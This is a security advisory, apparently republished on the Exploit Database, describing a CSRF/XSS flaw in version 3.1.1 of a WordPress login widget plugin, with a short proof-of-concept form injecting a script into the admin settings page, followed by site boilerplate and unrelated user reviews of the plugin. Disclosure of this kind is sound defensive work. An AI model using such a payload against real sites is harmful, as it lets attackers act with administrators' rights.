**Vulnerable App:**

```
Details
================
Software: Login Widget With Shortcode
Version: 3.1.1
Homepage: http://wordpress.org/plugins/login-sidebar-widget/
Advisory report: https://security.dxw.com/advisories/csrfxss-vulnerablity-in-login-widget-with-shortcode-allows-unauthenticated-attackers-to-do-anything-an-admin-can-do/
CVE: Awaiting assignment
CVSS: 6.8 (Medium; AV:N/AC:M/Au:N/C:P/I:P/A:P)

Description
================
CSRF/XSS vulnerablity in Login Widget With Shortcode allows unauthenticated attackers to do anything an admin can do

Vulnerability
================
This plugin is vulnerable to a combination CSRF/XSS attack. An attacker able to convince an admin to visit a link of their choosing is able to insert arbitrary HTML into an admin page.  Using that ability they can use JavaScript to control an admin user’s browser, allowing the attacker to create user accounts, create posts, delete all posts, etc.

Proof of concept
================
If a logged-in administrator user clicks the submit button on this form, a javascript alert will display in the admin screens. (In a real attack the form can be made to auto-submit using Javascript).
<form method=\"POST\" action=\"http://localhost/wp-admin/options-general.php?page=login_widget_afo\">
  <input type=\"text\" name=\"custom_style_afo\" value=\"&lt;/textarea&gt;<script>alert(1)</script>\">
  <input type=\"text\" name=\"option\" value=\"login_widget_afo_save_settings\">
  <input type=\"submit\">
</form>

Mitigations
================
Upgrade to version 3.2.1 or later.

Disclosure policy
================
dxw believes in responsible disclosure. Your attention is drawn to our disclosure policy: https://security.dxw.com/disclosure/

Please contact us on security@dxw.com to acknowledge this report if you received it via a third party (for example, plugins@wordpress.org) as they generally cannot communicate with us on your behalf.

This vulnerability will be published if we do not receive a response to this report with 14 days.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

It helped me a lot to get rid of the extra stuff in the regular login page.

I cannot believe that this plugin does not allow people to set their own passwords.
It sends an email with the new password and the new password is only 7 characters long, much too short to be save. I’ve blocked subscribers from the admin area so they will then never be able to set a better one. What a weird thing to do. I can’t use this.

CAPTCHA fails every time. In fact if you add the captcha to admin it will prevent you logging into the site admin. The letters numbers were perfectly clear and we asked 3 people to confirm. IN addition the code does not refresh, so you have no chance of entering a new one. Gotta fix this!!

Simple and easy to use. Works as expected. With latest update, developers were up front that it was a major rewrite and users may need to reset some settings. Once this was done, everything works fine.

Be prepared to modify the php and css to get this to look more pleasing, because the bare bones plugin takes zero effort to make the login form look even slightly decent. Also, uses a easily defeatable capthica that has been known to be worthless instead of just implementing the Google Capthica.
